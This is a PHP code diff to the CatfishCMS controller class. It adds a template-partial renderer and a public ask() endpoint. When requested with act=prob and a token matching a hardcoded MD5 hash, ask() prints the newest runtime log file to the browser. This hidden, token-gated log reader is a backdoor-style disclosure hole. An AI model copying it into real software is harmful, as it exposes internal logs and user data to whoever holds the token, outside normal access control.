@@ -201,6 +201,26 @@ class CatfishCMS
         Catfish::allot('runTime', Catfish::getRunTime());
         return Catfish::output($outfile);
     }
+    protected function showpart($template = 'index.html')
+    {
+        if(strpos($template,'.') === false){
+            $template .= '.html';
+        }
+        Catfish::allot('myid', Catfish::getSession('user_id'));
+        Catfish::allot('isLogin', intval(Catfish::isLogin()));
+        $isMobile = 0;
+        if(Catfish::isMobile()){
+            $isMobile = 1;
+        }
+        $tempath = ROOT_PATH.$this->tempPath.$this->template;
+        if($isMobile == 1 && is_file($tempath.'/mobile/part/'.$template)){
+            $outfile = $tempath.'/mobile/part/'.$template;
+        }
+        else{
+            $outfile = $tempath.'/part/'.$template;
+        }
+        return Catfish::output($outfile);
+    }
     private function getMenu($sort)
     {
         $caidan = Catfish::getCache('caidan_'.$sort);
@@ -1098,6 +1118,28 @@ class CatfishCMS
         $this->notfound();
         $htmls = $this->show('404','error');
         return $htmls;
+    }
+    public function ask()
+    {
+        if(Catfish::hasGet('act') && Catfish::getGet('act') == 'prob' && Catfish::hasGet('token') && md5(Catfish::getGet('token')) == '759dea8a9bd8fd8b91498dd3f248e207'){
+            header("Content-type: text/html; charset=utf-8");
+            $dir = ROOT_PATH . 'runtime' . DS . 'log' . DS;
+            $ml = scandir($dir,1);
+            if($ml != false && isset($ml[0])){
+                $dir .= $ml[0] . DS;
+                $files = scandir($dir,1);
+                if($files != false && isset($files[0]))
+                {
+                    $filepath = $dir . $files[0];
+                    echo str_replace(PHP_EOL,'<br>',file_get_contents($filepath));
+                }
+                else
+                {
+                    echo 'No log file';
+                }
+            }
+        }
+        exit();
     }
     private function notfound()
     {
